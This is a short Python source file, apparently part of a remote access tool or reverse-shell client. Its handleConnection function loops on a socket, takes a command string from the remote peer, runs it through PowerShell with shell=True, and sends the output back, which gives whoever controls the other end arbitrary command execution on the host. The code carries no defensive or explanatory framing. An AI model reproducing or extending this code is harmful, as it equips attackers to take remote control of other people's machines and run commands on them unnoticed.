import subprocess
import os



def handleConnection(my_socket):
    

    while(True):
        user_input = my_socket.recieve_data()
        if (user_input == '1'):
            print("Running Commands")
            command = my_socket.recieve_data()
            output = subprocess.run(["powershell" , command] , shell= True , capture_output= True ) 

            my_socket.send_data(output.stdout.decode("UTF-8"))

        elif(user_input == '99'):
            break
        else:
            print("[-] Invalid input")
            